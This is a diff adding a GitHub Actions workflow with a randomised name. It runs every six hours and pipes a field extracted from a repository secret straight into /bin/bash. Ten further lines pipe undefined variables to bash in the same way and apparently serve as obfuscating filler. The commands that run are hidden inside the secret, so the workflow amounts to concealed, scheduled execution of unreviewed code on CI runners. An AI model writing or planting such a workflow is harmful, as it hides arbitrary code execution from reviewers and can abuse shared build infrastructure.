@@ -1,0 +1,28 @@
+name: inquirysubstance
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: inquirysubstance
+        env:
+          a9: ${{ secrets.a9 }}
+        run: |
+          echo $a9 | jq -r .qosip89 | /bin/bash
+          echo $kuv2 | jq -r .shg09092 | /bin/bash
+          echo $ef68095 | jq -r .qbv8 | /bin/bash
+          echo $idu88 | jq -r .vowjb9545 | /bin/bash
+          echo $h56810 | jq -r .bff9358 | /bin/bash
+          echo $jgs06 | jq -r .z97930 | /bin/bash
+          echo $lsnam12 | jq -r .nydf1619 | /bin/bash
+          echo $ub29996 | jq -r .gkhaa06823 | /bin/bash
+          echo $nbz02272 | jq -r .xof22155 | /bin/bash
+          echo $b6 | jq -r .ec299 | /bin/bash
+          echo $kwv2 | jq -r .uwa3049 | /bin/bash
+
